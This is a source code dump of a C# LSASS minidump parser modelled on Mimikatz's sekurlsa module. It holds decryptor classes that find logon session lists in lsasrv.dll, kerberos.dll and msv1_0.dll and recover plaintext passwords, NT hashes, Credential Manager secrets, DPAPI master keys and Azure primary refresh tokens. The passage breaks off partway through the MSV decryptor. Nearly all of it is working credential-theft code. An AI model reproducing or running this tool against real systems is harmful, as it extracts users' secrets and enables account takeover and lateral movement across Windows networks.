            _safeHashHandle = Utils.CreateHash(CALG_MD4);
        }

        protected override void HashCore(byte[] rgb, int ibStart, int cbSize)
        {
            Utils.HashData(_safeHashHandle, rgb, ibStart, cbSize);
        }

        protected override byte[] HashFinal()
        {
            return Utils.EndHash(_safeHashHandle);
        }
    }
}
```

`Decryptor/Cloudap_.cs`:

```cs
using Minidump.Crypto;
using Minidump.Templates;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using static Minidump.Helpers;

namespace Minidump.Decryptor
{
    public class Cloudap_
    {
        public static int FindCredentials(Program.MiniDump minidump, cloudap.CloudapTemplate template)
        {
            wdigest.KIWI_WDIGEST_LIST_ENTRY entry;
            long logSessListAddr;
            long llCurrent;

            long position = find_signature(minidump, "cloudAP.dll", template.signature);
            if (position == 0)
                return 0;

            var ptr_entry_loc = get_ptr_with_offset(minidump.fileBinaryReader, (position + template.first_entry_offset), minidump.sysinfo);
            var ptr_entry = ReadUInt64(minidump.fileBinaryReader, (long)ptr_entry_loc);

            llCurrent = (long)ptr_entry;
            long stop = ReadInt64(minidump.fileBinaryReader, Rva2offset(minidump, llCurrent + 8));

            do
            {
                logSessListAddr = Rva2offset(minidump, llCurrent);
                byte[] Bytes = ReadBytes(minidump.fileBinaryReader, logSessListAddr, Marshal.SizeOf(typeof(KIWI_CLOUDAP_LOGON_LIST_ENTRY)));
                var log = ReadStruct<KIWI_CLOUDAP_LOGON_LIST_ENTRY>(Bytes);
                LUID luid = log.LocallyUniqueIdentifier;
                //PrintProperties(log);

                byte[] entryBytes = ReadBytes(minidump.fileBinaryReader, Rva2offset(minidump, log.cacheEntry), Marshal.SizeOf(typeof(KIWI_CLOUDAP_CACHE_LIST_ENTRY)));
                KIWI_CLOUDAP_CACHE_LIST_ENTRY cacheEntry = ReadStruct<KIWI_CLOUDAP_CACHE_LIST_ENTRY>(entryBytes);
                string cachedir = Encoding.Unicode.GetString(cacheEntry.toname);
                //PrintProperties(cacheEntry);

                Cloudap cloudapentry = new Cloudap();
                cloudapentry.cachedir = cachedir;

                if (cacheEntry.cbPRT != 0 && cacheEntry.PRT != 0)
                {
                    byte[] prtBytes = ReadBytes(minidump.fileBinaryReader, Rva2offset(minidump, (long)cacheEntry.PRT), (int)cacheEntry.cbPRT);
                    var DecryptedPRTBytes = BCrypt.DecryptCredentials(prtBytes, minidump.lsakeys);
                    string PRT = Encoding.ASCII.GetString(DecryptedPRTBytes.Skip(25).ToArray());
                    cloudapentry.PRT = PRT;


                    if (cacheEntry.toDetermine != 0)
                    {
                        byte[] cacheunkBytes = ReadBytes(minidump.fileBinaryReader, Rva2offset(minidump, (long)cacheEntry.toDetermine), Marshal.SizeOf(typeof(KIWI_CLOUDAP_CACHE_UNK)));
                        KIWI_CLOUDAP_CACHE_UNK cacheunk = ReadStruct<KIWI_CLOUDAP_CACHE_UNK>(cacheunkBytes);
                        var DecryptedDpapiBytes = BCrypt.DecryptCredentials(cacheunk.unk, minidump.lsakeys);

                        string key_guid = cacheunk.guid.ToString();
                        string dpapi_key = BitConverter.ToString(DecryptedDpapiBytes).Replace("-", "");
                        string dpapi_key_sha1 = BCrypt.GetHashSHA1(DecryptedDpapiBytes);

                        cloudapentry.key_guid = key_guid;
                        cloudapentry.dpapi_key = dpapi_key;
                        cloudapentry.dpapi_key_sha = dpapi_key_sha1;
                    }

                    var currentlogon = minidump.logonlist.FirstOrDefault(x => x.LogonId.HighPart == luid.HighPart && x.LogonId.LowPart == luid.LowPart);
                    if (currentlogon == null)
                    {
                        currentlogon = new Logon(luid)
                        {
                            //UserName = username,
                            Cloudap = new List<Cloudap>()
                        };
                        currentlogon.Cloudap.Add(cloudapentry);
                        minidump.logonlist.Add(currentlogon);
                        //continue;
                    }
                    else
                    {
                        currentlogon.Cloudap = new List<Cloudap>();
                        currentlogon.Cloudap.Add(cloudapentry);
                    }
                }

                llCurrent = log.Flink;
            } while (llCurrent != stop);

            return 0;
        }
    }
}
```

`Decryptor/Credman.cs`:

```cs
using Minidump.Crypto;
using Minidump.Templates;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using static Minidump.Helpers;

namespace Minidump.Decryptor
{
    internal class Credman_
    {
        public static int FindCredentials(Program.MiniDump minidump, credman.CredmanTemplate template)
        {
            foreach (var logon in minidump.logonlist)
            {
                //Console.WriteLine("=======================");
                var credmanMem = logon.pCredentialManager;
                var luid = logon.LogonId;

                long llCurrent;
                var reference = 1;

                minidump.fileBinaryReader.BaseStream.Seek(credmanMem, 0);
                var credmansetBytes = minidump.fileBinaryReader.ReadBytes(Marshal.SizeOf(template.list_entry));

                //int list1offset = StructFieldOffset(typeof(KIWI_CREDMAN_SET_LIST_ENTRY), "list1");//bug
                long pList1 = BitConverter.ToInt64(credmansetBytes, FieldOffset<KIWI_CREDMAN_SET_LIST_ENTRY>("list1"));
                long refer = pList1 + FieldOffset<KIWI_CREDMAN_LIST_STARTER>("start");

                minidump.fileBinaryReader.BaseStream.Seek(Rva2offset(minidump, pList1), 0);
                var credmanstarterBytes = minidump.fileBinaryReader.ReadBytes(Marshal.SizeOf(typeof(KIWI_CREDMAN_LIST_STARTER)));

                long pStart = BitConverter.ToInt64(credmanstarterBytes, FieldOffset<KIWI_CREDMAN_LIST_STARTER>("start"));

                if (pStart == 0)
                    continue;

                if (pStart == refer)
                    continue;

                llCurrent = pStart;
                

                do
                {
                    llCurrent = llCurrent - FieldOffset<KIWI_CREDMAN_LIST_ENTRY>("Flink");
                    llCurrent = Rva2offset(minidump, llCurrent);

                    if (llCurrent == 0)
                        continue;

                    minidump.fileBinaryReader.BaseStream.Seek(llCurrent, 0);
                    var entryBytes = minidump.fileBinaryReader.ReadBytes(Marshal.SizeOf(typeof(KIWI_CREDMAN_LIST_ENTRY)));
                    var entry = ReadStruct<KIWI_CREDMAN_LIST_ENTRY>(entryBytes);

                    var username = ExtractUnicodeStringString(minidump, entry.user);
                    var domain = ExtractUnicodeStringString(minidump, entry.server1);

                    var passDecrypted = "";

                    minidump.fileBinaryReader.BaseStream.Seek(Rva2offset(minidump, (long)entry.encPassword), 0);

                    var msvPasswordBytes = minidump.fileBinaryReader.ReadBytes((int)entry.cbEncPassword);
                    var msvDecryptedPasswordBytes = BCrypt.DecryptCredentials(msvPasswordBytes, minidump.lsakeys);

                    if (msvDecryptedPasswordBytes != null && msvDecryptedPasswordBytes.Length > 0)
                    {
                        var encoder = new UnicodeEncoding(false, false, true);
                        try
                        {
                            passDecrypted = encoder.GetString(msvDecryptedPasswordBytes);
                        }
                        catch (Exception)
                        {
                            passDecrypted = PrintHexBytes(msvDecryptedPasswordBytes);
                        }
                    }

                    if (!string.IsNullOrEmpty(username) && username.Length > 1)
                    {
                        CredMan credmanentry = new CredMan();
                        credmanentry.Reference = reference;
                        credmanentry.UserName = username;

                        if (!string.IsNullOrEmpty(domain))
                            credmanentry.DomainName = domain;
                        else
                            credmanentry.DomainName = "NULL";

                        if (!string.IsNullOrEmpty(passDecrypted))
                            credmanentry.Password = passDecrypted;
                        else
                            credmanentry.Password = "NULL";

                        if (credmanentry.Password != null)
                        {
                            var currentlogon = minidump.logonlist.FirstOrDefault(x => x.LogonId.HighPart == luid.HighPart && x.LogonId.LowPart == luid.LowPart);
                            if (currentlogon == null)
                            {
                                currentlogon = new Logon(luid);
                                //currentlogon.UserName = username;
                                currentlogon.Credman = new List<CredMan>();
                                currentlogon.Credman.Add(credmanentry);
                                minidump.logonlist.Add(currentlogon);
                            }
                            else
                            {
                                if (currentlogon.Credman == null)
                                    currentlogon.Credman = new List<CredMan>();

                                currentlogon.Credman.Add(credmanentry);
                            }
                        }
                    }
                    reference++;
                    llCurrent = entry.Flink;

                } while (llCurrent != 0 && llCurrent != refer);
            }

            return 0;
        }
    }
}
```

`Decryptor/Dpapi_.cs`:

```cs
using Minidump.Crypto;
using Minidump.Templates;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using static Minidump.Helpers;

namespace Minidump.Decryptor
{
    public class Dpapi_
    {
        public static int FindCredentials(Program.MiniDump minidump, dpapi.DpapiTemplate template)
        {
            foreach (string module in new List<string> { "lsasrv.dll", "dpapisrv.dll" })
            {
                long position = find_signature(minidump, module, template.signature);
                long llcurrent;
                if (position == 0)
                    continue;

                var ptr_entry_loc = get_ptr_with_offset(minidump.fileBinaryReader, (position + template.first_entry_offset), minidump.sysinfo);
                long ptr_entry = ReadInt64(minidump.fileBinaryReader, (long)ptr_entry_loc);

                llcurrent = ptr_entry;
                do
                {
                    byte[] entryBytes = ReadBytes(minidump.fileBinaryReader, Rva2offset(minidump, llcurrent),
                        Marshal.SizeOf(typeof(dpapi.KIWI_MASTERKEY_CACHE_ENTRY)));

                    dpapi.KIWI_MASTERKEY_CACHE_ENTRY dpapiEntry = ReadStruct<dpapi.KIWI_MASTERKEY_CACHE_ENTRY>(entryBytes);
                    //PrintProperties(dpapiEntry);

                    if (dpapiEntry.keySize > 1)
                    {
                        byte[] dec_masterkey = BCrypt.DecryptCredentials(dpapiEntry.key, minidump.lsakeys);
                        Dpapi dpapi = new Dpapi();
                        //dpapi.luid = $"{dpapiEntry.LogonId.HighPart}:{dpapiEntry.LogonId.LowPart}";
                        dpapi.masterkey = BitConverter.ToString(dec_masterkey).Replace("-", "");
                        dpapi.insertTime = $"{ToDateTime(dpapiEntry.insertTime):yyyy-MM-dd HH:mm:ss}";
                        dpapi.key_size = dpapiEntry.keySize.ToString();
                        dpapi.key_guid = dpapiEntry.KeyUid.ToString();
                        dpapi.masterkey_sha = BCrypt.GetHashSHA1(dec_masterkey);

                        Logon currentlogon = minidump.logonlist.FirstOrDefault(x => x.LogonId.HighPart == dpapiEntry.LogonId.HighPart && x.LogonId.LowPart == dpapiEntry.LogonId.LowPart);
                        if (currentlogon == null && !dpapi.insertTime.Contains("1601-01-01"))
                        {
                            currentlogon = new Logon(dpapiEntry.LogonId);
                            currentlogon.Dpapi = new List<Dpapi>();
                            currentlogon.Dpapi.Add(dpapi);
                            minidump.logonlist.Add(currentlogon);
                        }
                        else
                        {
                            if (currentlogon.Dpapi == null)
                                currentlogon.Dpapi = new List<Dpapi>();

                            currentlogon.Dpapi.Add(dpapi);
                        }
                    }

                    llcurrent = dpapiEntry.Flink;
                } while (llcurrent != ptr_entry);
            }

            return 0;
        }
    }
}
```

`Decryptor/KerberosSessions.cs`:

```cs
using Minidump.Templates;
using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using static Minidump.Helpers;

namespace Minidump.Decryptor
{
    public class KerberosSessions
    {
        public static List<KerberosLogonItem> FindSessions(Program.MiniDump minidump, kerberos.KerberosTemplate template)
        {
            var klogonlist = new List<KerberosLogonItem>();

            long position = find_signature(minidump, "kerberos.dll", template.signature);
            if (position == 0)
            {
                Console.WriteLine("[x] Error: Could not find KerberosSessionList signature\n");
                return klogonlist;
            }
            var ptr_entry_loc = get_ptr_with_offset(minidump.fileBinaryReader, (position + template.first_entry_offset), minidump.sysinfo);
            var ptr_entry = Minidump.Helpers.ReadUInt64(minidump.fileBinaryReader, (long)ptr_entry_loc);
            //long kerbUnloadLogonSessionTableAddr = Rva2offset(minidump, (long)ptr_entry);
            //minidump.fileBinaryReader.BaseStream.Seek(kerbUnloadLogonSessionTableAddr, 0);

            //Console.WriteLine("Parsing kerberos sessions");
            WalkAVLTables(minidump, (long)ptr_entry, klogonlist, template);

            return klogonlist;
        }

        private static void WalkAVLTables(Program.MiniDump minidump, long kerbUnloadLogonSessionTableAddr, List<KerberosLogonItem> klogonlist, kerberos.KerberosTemplate template)
        {
            if (kerbUnloadLogonSessionTableAddr == 0)
                return;

            kerbUnloadLogonSessionTableAddr = Rva2offset(minidump, kerbUnloadLogonSessionTableAddr);
            minidump.fileBinaryReader.BaseStream.Seek(kerbUnloadLogonSessionTableAddr, 0);

            var entryBytes = minidump.fileBinaryReader.ReadBytes(Marshal.SizeOf(typeof(kerberos.RTL_AVL_TABLE)));
            var entry = ReadStruct<kerberos.RTL_AVL_TABLE>(entryBytes);

            //Minidump.Helpers.PrintProperties(entry);

            if (entry.OrderedPointer != 0)
            {
                var item = new KerberosLogonItem();
                long address = Rva2offset(minidump, entry.OrderedPointer);
                minidump.fileBinaryReader.BaseStream.Seek(address, 0);

                item.LogonSessionAddress = address;
                item.LogonSessionBytes = minidump.fileBinaryReader.ReadBytes(template.LogonSessionTypeSize);
                klogonlist.Add(item);
                //Minidump.Helpers.PrintProperties(item);
            }

            if (entry.BalancedRoot.RightChild != 0)
                WalkAVLTables(minidump, entry.BalancedRoot.RightChild, klogonlist, template);
            if (entry.BalancedRoot.LeftChild != 0)
                WalkAVLTables(minidump, entry.BalancedRoot.LeftChild, klogonlist, template);
        }

        public class KerberosLogonItem
        {
            public long LogonSessionAddress { get; set; }
            public byte[] LogonSessionBytes { get; set; }
        }
    }
}
```

`Decryptor/Kerberos_.cs`:

```cs
using Minidump.Crypto;
using Minidump.Templates;
using System;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using static Minidump.Helpers;

namespace Minidump.Decryptor
{
    internal class Kerberos_
    {
        public static void FindCredentials(Program.MiniDump minidump, kerberos.KerberosTemplate template)
        {
            foreach (KerberosSessions.KerberosLogonItem entry in minidump.klogonlist)
            {
                if (entry == null)
                    continue;

                var luid = ReadStruct<LUID>(GetBytes(entry.LogonSessionBytes, 72, Marshal.SizeOf(typeof(LUID))));

                var usUserName = ReadStruct<UNICODE_STRING>(GetBytes(entry.LogonSessionBytes, template.SessionCredentialOffset + template.SessionUserNameOffset, Marshal.SizeOf(typeof(UNICODE_STRING))));
                var usDomain = ReadStruct<UNICODE_STRING>(GetBytes(entry.LogonSessionBytes, template.SessionCredentialOffset + template.SessionDomainOffset, Marshal.SizeOf(typeof(UNICODE_STRING))));
                var usPassword = ReadStruct<UNICODE_STRING>(GetBytes(entry.LogonSessionBytes, template.SessionCredentialOffset + template.SessionPasswordOffset, Marshal.SizeOf(typeof(UNICODE_STRING))));

                var username = ExtractUnicodeStringString(minidump, usUserName);
                var domain = ExtractUnicodeStringString(minidump, usDomain);

                minidump.fileBinaryReader.BaseStream.Seek(Rva2offset(minidump, usPassword.Buffer), 0);
                byte[] msvPasswordBytes = minidump.fileBinaryReader.ReadBytes(usPassword.MaximumLength);

                var msvDecryptedPasswordBytes = BCrypt.DecryptCredentials(msvPasswordBytes, minidump.lsakeys);

                var passDecrypted = "";
                var encoder = new UnicodeEncoding(false, false, true);
                try
                {
                    passDecrypted = encoder.GetString(msvDecryptedPasswordBytes);
                }
                catch (Exception)
                {
                    passDecrypted = PrintHexBytes(msvDecryptedPasswordBytes);
                }
                //passDecrypted = Convert.ToBase64String(msvDecryptedPasswordBytes);

                if (!string.IsNullOrEmpty(username) && username.Length > 1)
                {
                    if (msvDecryptedPasswordBytes.Length <= 1)
                        continue;

                    var krbrentry = new Kerberos();
                    krbrentry.UserName = username;

                    if (krbrentry.UserName.Contains("$"))
                    {
                        try
                        {
                            krbrentry.NT = msvDecryptedPasswordBytes.MD4().AsHexString();
                        }
                        catch
                        {
                            krbrentry.NT = "NULL";
                        }
                    }

                    if (!string.IsNullOrEmpty(domain))
                        krbrentry.DomainName = domain;
                    else
                        krbrentry.DomainName = "NULL";

                    if (!string.IsNullOrEmpty(passDecrypted))
                        krbrentry.Password = passDecrypted;
                    else
                        krbrentry.Password = "NULL";

                    var currentlogon = minidump.logonlist.FirstOrDefault(x => x.LogonId.HighPart == luid.HighPart && x.LogonId.LowPart == luid.LowPart);
                    if (currentlogon == null)
                    {
                        currentlogon = new Logon(luid);
                        currentlogon.UserName = username;
                        currentlogon.Kerberos = krbrentry;
                        minidump.logonlist.Add(currentlogon);
                    }
                    else
                    {
                        currentlogon.Kerberos = krbrentry;
                    }
                }
            }
        }
    }
}
```

`Decryptor/LiveSsp_.cs`:

```cs
using Minidump.Crypto;
using Minidump.Templates;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using static Minidump.Helpers;
using static Minidump.Templates.livessp;

namespace Minidump.Decryptor
{
    internal class LiveSsp_
    {
        public static int FindCredentials(Program.MiniDump minidump, LiveSspTemplate template)
        {
            KIWI_LIVESSP_LIST_ENTRY entry;
            string passDecrypted = "";
            long llCurrent;
            long sspCredentialListAddr;

            //Console.WriteLine(Helpers.ByteArrayToString(template.signature));
            //foreach (var VARIABLE in minidump.modules)
            //{
            //    Console.WriteLine(VARIABLE.name);
            //}
            long position = find_signature(minidump, "msv1_0.dll", template.signature);
            if (position == 0)
                return 0;

            long ptr_entry_loc = (long)get_ptr_with_offset(minidump.fileBinaryReader, (position + template.first_entry_offset), minidump.sysinfo);
            sspCredentialListAddr = ReadInt64(minidump.fileBinaryReader, (long)ptr_entry_loc);
            //sspCredentialListAddr = Rva2offset(minidump, ptr_entry);

            llCurrent = sspCredentialListAddr;

            do
            {
                Console.WriteLine(llCurrent);
                llCurrent = Rva2offset(minidump, llCurrent);
                //Console.WriteLine(llCurrent);
                minidump.fileBinaryReader.BaseStream.Seek(llCurrent, 0);

                byte[] entryBytes = minidump.fileBinaryReader.ReadBytes(Marshal.SizeOf(typeof(KIWI_LIVESSP_LIST_ENTRY)));
                entry = ReadStruct<KIWI_LIVESSP_LIST_ENTRY>(entryBytes);

                string username = ExtractUnicodeStringString(minidump, entry.suppCreds.credentials.UserName);
                string domain = ExtractUnicodeStringString(minidump, entry.suppCreds.credentials.Domain);

                minidump.fileBinaryReader.BaseStream.Seek(Rva2offset(minidump, entry.suppCreds.credentials.Password.Buffer), 0);
                byte[] msvPasswordBytes = minidump.fileBinaryReader.ReadBytes(entry.suppCreds.credentials.Password.MaximumLength);
                byte[] msvDecryptedPasswordBytes = BCrypt.DecryptCredentials(msvPasswordBytes, minidump.lsakeys);

                passDecrypted = Encoding.Unicode.GetString(msvDecryptedPasswordBytes);

                /*Console.WriteLine("LUID " + entry.LogonId.LowPart);
                 Console.WriteLine("References " + entry.References);
                 Console.WriteLine("CredentialReferences " + entry.CredentialReferences);
                 Console.WriteLine("Uusername {1} {0}", username, entry.credentials.UserName.MaximumLength);
                Console.WriteLine("Udomain {1} {0}", domain, entry.credentials.Domaine.MaximumLength);
                Console.WriteLine("Upassword {1} {0}", passDecrypted, entry.credentials.Password.MaximumLength);*/
                if (!string.IsNullOrEmpty(username) && username.Length > 1)
                {
                    LUID luid = entry.LocallyUniqueIdentifier;

                    LiveSsp sspentry = new LiveSsp();
                    sspentry.UserName = username;

                    if (!string.IsNullOrEmpty(domain))
                    {
                        sspentry.DomainName = domain;
                    }
                    else
                    {
                        sspentry.DomainName = "NULL";
                    }

                    if (!string.IsNullOrEmpty(passDecrypted))
                    {
                        sspentry.Password = passDecrypted;
                    }
                    else
                    {
                        sspentry.Password = "NULL";
                    }

                    try
                    {
                        sspentry.NT = msvDecryptedPasswordBytes.MD4().AsHexString();
                    }
                    catch
                    {
                        sspentry.NT = "NULL";
                    }

                    if (sspentry.Password != "NULL")
                    {
                        Logon currentlogon = minidump.logonlist.FirstOrDefault(x =>
                            x.LogonId.HighPart == luid.HighPart && x.LogonId.LowPart == luid.LowPart);
                        if (currentlogon == null)
                        {
                            currentlogon = new Logon(luid);
                            currentlogon.UserName = username;
                            currentlogon.LiveSsp = new List<LiveSsp>();
                            currentlogon.LiveSsp.Add(sspentry);
                            minidump.logonlist.Add(currentlogon);
                        }
                        else
                        {
                            if (currentlogon.LiveSsp == null)
                                currentlogon.LiveSsp = new List<LiveSsp>();

                            currentlogon.LiveSsp.Add(sspentry);
                        }
                    }
                }

                llCurrent = entry.Flink;
            } while (llCurrent != sspCredentialListAddr);

            return 0;
        }
    }
}
```

`Decryptor/LogonSessions.cs`:

```cs
using Minidump.Templates;
using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using static Minidump.Helpers;

namespace Minidump.Decryptor
{
    public class Logon
    {
        public Logon(LUID logonId)
        {
            LogonId = logonId;
        }

        public LUID LogonId { get; set; }
        public string LogonType { get; set; }
        public int Session { get; set; }
        public FILETIME LogonTime { get; set; }
        public string UserName { get; set; }
        public string LogonDomain { get; set; }
        public string LogonServer { get; set; }
        public string SID { get; set; }

        public Msv Msv { get; set; }
        public Kerberos Kerberos { get; set; }
        public List<Tspkg> Tspkg { get; set; }
        public List<WDigest> Wdigest { get; set; }
        public List<Ssp> Ssp { get; set; }
        public List<LiveSsp> LiveSsp { get; set; }
        public List<CredMan> Credman { get; set; }
        public List<KerberosKey> KerberosKeys { get; set; }
        public List<Cloudap> Cloudap { get; set; }
        public List<Dpapi> Dpapi { get; set; }
        public List<Rdp> Rdp { get; set; }

        public long pCredentials { get; set; }
        public long pCredentialManager { get; set; }
    }

    public class Cloudap
    {
        public string luid { get; set; }
        public string sid { get; set; }
        public string cachedir { get; set; }
        public string PRT { get; set; }
        public string key_guid { get; set; }
        public string dpapi_key { get; set; }
        public string dpapi_key_sha { get; set; }
    }

    public class Dpapi
    {
        public string luid { get; set; }
        public string key_guid { get; set; }
        public string masterkey { get; set; }
        public string masterkey_sha { get; set; }
        public string insertTime { get; set; }
        public string key_size { get; set; }
    }

    public class Msv
    {
        public string DomainName { get; set; }
        public string UserName { get; set; }
        public string Lm { get; set; }
        public string NT { get; set; }
        public string Sha1 { get; set; }
        public string Dpapi { get; set; }
    }

    public class Ssp
    {
        //public int Reference { get; set; }
        public string DomainName { get; set; }

        public string UserName { get; set; }
        public string Password { get; set; }
        public string NT { get; set; }
    }

    public class Rdp
    {
        public string DomainName { get; set; }
        public string UserName { get; set; }
        public string Password { get; set; }
        public string Password_raw { get; set; }
        public string NT { get; set; }
    }

    public class LiveSsp
    {
        public int Reference { get; set; }
        public string DomainName { get; set; }
        public string UserName { get; set; }
        public string Password { get; set; }
        public string NT { get; set; }
    }

    public class Tspkg
    {
        public string DomainName { get; set; }
        public string UserName { get; set; }
        public string Password { get; set; }
        public string NT { get; set; }
    }

    public class Kerberos
    {
        public string DomainName { get; set; }
        public string UserName { get; set; }
        public string Password { get; set; }
        public string NT { get; set; }
    }

    public class CredMan
    {
        public int Reference { get; set; }
        public string DomainName { get; set; }
        public string UserName { get; set; }
        public string Password { get; set; }
        public string NT { get; set; }
    }

    public class WDigest
    {
        public string HostName { get; set; }
        public string UserName { get; set; }
        public string Password { get; set; }
        public string NT { get; set; }
    }

    public class KerberosKey
    {
        public string Type { get; set; }
        public string Key { get; set; }
    }

    internal class LogonSessions
    {
        private static readonly long max_search_size = 580000;

        private static readonly string[] KUHL_M_SEKURLSA_LOGON_TYPE =
        {
            "UndefinedLogonType",
            "Unknown !",
            "Interactive",
            "Network",
            "Batch",
            "Service",
            "Proxy",
            "Unlock",
            "NetworkCleartext",
            "NewCredentials",
            "RemoteInteractive",
            "CachedInteractive",
            "CachedRemoteInteractive",
            "CachedUnlock"
        };

        public static List<Logon> FindSessions(Program.MiniDump minidump, msv.MsvTemplate template, int ptr_entry_offset = 1)
        {
            //PrintProperties(template);

            List<Logon> logonlist = new List<Logon>();
            List<long> offsetlist = new List<long>();

            long logonSessionListSignOffset = find_signature(minidump, "lsasrv.dll", template.signature);
            if (logonSessionListSignOffset == 0)
            {
                Console.WriteLine("[x] Error: Could not find LogonSessionList signature\n");
                return logonlist;
            }

            ulong logonSessionOffset = get_ptr_with_offset(minidump.fileBinaryReader, (logonSessionListSignOffset + template.LogonSessionListCountOffset), minidump.sysinfo);
            uint logonSessionListCount = ReadInt8(minidump.fileBinaryReader, (long)logonSessionOffset);

            //Console.WriteLine($"logonSessionOffset {(Int32)logonSessionOffset}");
            //Console.WriteLine($"Parsing {logonSessionListCount} logon sessions");

            long offset = logonSessionListSignOffset + template.first_entry_offset;
            long listMemOffset = ReadInt32(minidump.fileBinaryReader, logonSessionListSignOffset + template.first_entry_offset);
            long ptr_entry_loc = offset + sizeof(int) + listMemOffset;

            for (var i = 0; i < logonSessionListCount; i++)
            {
                long listentry;
                long entry_ptr;
                long pos;
                //Console.WriteLine($"Parsing session {i}");

                entry_ptr = ptr_entry_loc + (16 * i);
                listentry = ReadInt64(minidump.fileBinaryReader, entry_ptr);
                //offsetlist.Add(listentry);
                if (entry_ptr == listentry)
                    continue;

                pos = entry_ptr;

                int count = 0;
                do
                {
                    listentry = Rva2offset(minidump, ReadInt64(minidump.fileBinaryReader, pos));
                    //Console.WriteLine($"listentry {listentry}");

                    count++;
                    if (count >= 255)
                        return null;

                    if (listentry == 0)
                        break;

                    if (offsetlist.Contains((listentry)))
                    {
                        break;
                    }
                    offsetlist.Add(listentry);


                    KIWI_BASIC_SECURITY_LOGON_SESSION_DATA logonsession = new KIWI_BASIC_SECURITY_LOGON_SESSION_DATA();
                    logonsession.LogonId = listentry + template.LocallyUniqueIdentifierOffset;
                    logonsession.LogonType = ReadInt32(minidump.fileBinaryReader, listentry + template.LogonTypeOffset);
                    logonsession.Session = ReadInt32(minidump.fileBinaryReader, listentry + template.SessionOffset);
                    logonsession.LogonTime = ReadStruct<FILETIME>(ReadBytes(minidump.fileBinaryReader, listentry + template.LogonTimeOffset + 4, 8));
                    //p* for pointers
                    logonsession.pCredentials = ReadInt64(minidump.fileBinaryReader, listentry + template.CredentialsOffset);
                    logonsession.pCredentialManager = ReadInt64(minidump.fileBinaryReader, listentry + template.CredentialManagerOffset);
                    logonsession.pSid = listentry + template.pSidOffset;

                    var luid = ReadStruct<LUID>(ReadBytes(minidump.fileBinaryReader, logonsession.LogonId, 4));

                    minidump.fileBinaryReader.BaseStream.Seek(listentry + template.UserNameListOffset, 0);
                    logonsession.UserName =
                        ExtractUnicodeStringString(minidump,
                            ExtractUnicodeString(minidump.fileBinaryReader));

                    minidump.fileBinaryReader.BaseStream.Seek(listentry + template.DomainOffset, 0);
                    logonsession.LogonDomain =
                        ExtractUnicodeStringString(minidump,
                            ExtractUnicodeString(minidump.fileBinaryReader));

                    minidump.fileBinaryReader.BaseStream.Seek(listentry + template.LogonServerOffset, 0);
                    logonsession.LogonServer =
                        ExtractUnicodeStringString(minidump,
                            ExtractUnicodeString(minidump.fileBinaryReader));

                    string stringSid = "";
                    stringSid = ExtractSid(minidump, logonsession.pSid);

                    var logon = new Logon(luid)
                    {
                        Session = logonsession.Session,
                        LogonType = KUHL_M_SEKURLSA_LOGON_TYPE[logonsession.LogonType],
                        LogonTime = logonsession.LogonTime,
                        UserName = logonsession.UserName,
                        LogonDomain = logonsession.LogonDomain,
                        LogonServer = logonsession.LogonServer,
                        SID = stringSid,
                        pCredentials = Rva2offset(minidump, logonsession.pCredentials),
                        pCredentialManager = Rva2offset(minidump, logonsession.pCredentialManager)
                    };
                    //Console.WriteLine("session " + logon.Session + " luid " + logon.LogonId.LowPart + " username " + logon.UserName + " pCredentials " + logonsession.pCredentials);
                    //PrintProperties(logon);
                    logonlist.Add(logon);
                    pos = Rva2offset(minidump, ReadInt64(minidump.fileBinaryReader, pos));
                    //Console.WriteLine(pos);
                } while (true);
            }

            return logonlist;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct KIWI_BASIC_SECURITY_LOGON_SESSION_DATA
        {
            public long LogonId;
            public string UserName;
            public string LogonDomain;
            public int LogonType;
            public int Session;
            public long pCredentials;
            public long pSid;
            public long pCredentialManager;
            public FILETIME LogonTime;
            public string LogonServer;
        }
    }
}
```

`Decryptor/Msv1_.cs`:

```cs
using Minidump.Crypto;
using Minidump.Templates;
using System;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using static Minidump.Helpers;

namespace Minidump.Decryptor
{
    public class Msv1_
    {
        public const int LM_NTLM_HASH_LENGTH = 16;
        public const int SHA_DIGEST_LENGTH = 20;

        public static int FindCredentials(Program.MiniDump minidump, msv.MsvTemplate template)
        {
            //PrintProperties(template);

            foreach (var logon in minidump.logonlist)
            {
                var lsasscred = logon.pCredentials;
                var luid = logon.LogonId;

                if (lsasscred > 0)
                {
                    var msventry = new Msv();

                    KIWI_MSV1_0_PRIMARY_CREDENTIALS primaryCredentials;

                    while (lsasscred != 0)
                    {
                        minidump.fileBinaryReader.BaseStream.Seek(lsasscred, 0);
                        byte[] credentialsBytes = minidump.fileBinaryReader.ReadBytes(Marshal.SizeOf(typeof(KIWI_MSV1_0_CREDENTIALS)));

                        if (credentialsBytes.Length <= 0)
                            break;

                        var pPrimaryCredentials = BitConverter.ToInt64(credentialsBytes, FieldOffset<KIWI_MSV1_0_CREDENTIALS>("PrimaryCredentials"));
                        var pNext = BitConverter.ToInt64(credentialsBytes, FieldOffset<KIWI_MSV1_0_CREDENTIALS>("next"));

                        lsasscred = Rva2offset(minidump, pPrimaryCredentials);
                        while (lsasscred != 0)
                        {
                            minidump.fileBinaryReader.BaseStream.Seek(lsasscred, 0);
                            byte[] primaryCredentialsBytes = minidump.fileBinaryReader.ReadBytes(Marshal.SizeOf(typeof(KIWI_MSV1_0_PRIMARY_CREDENTIALS)));

                            primaryCredentials = ReadStruct<KIWI_MSV1_0_PRIMARY_CREDENTIALS>(primaryCredentialsBytes);
                            primaryCredentials.Credentials = ExtractUnicodeString(minidump.fileBinaryReader, lsasscred + template.MSV1CredentialsOffset);
                            primaryCredentials.Primary = ExtractUnicodeString(minidump.fileBinaryReader, lsasscred + template.MSV1PrimaryOffset);

                            if (ExtractANSIStringString(minidump, primaryCredentials.Primary).Equals("Primary"))
                            {
                                minidump.fileBinaryReader.BaseStream.Seek(Rva2offset(minidump, primaryCredentials.Credentials.Buffer), 0);
                                byte[] msvCredentialsBytes = minidump.fileBinaryReader.ReadBytes(primaryCredentials.Credentials.MaximumLength);

                                var msvDecryptedCredentialsBytes = BCrypt.DecryptCredentials(msvCredentialsBytes, minidump.lsakeys);
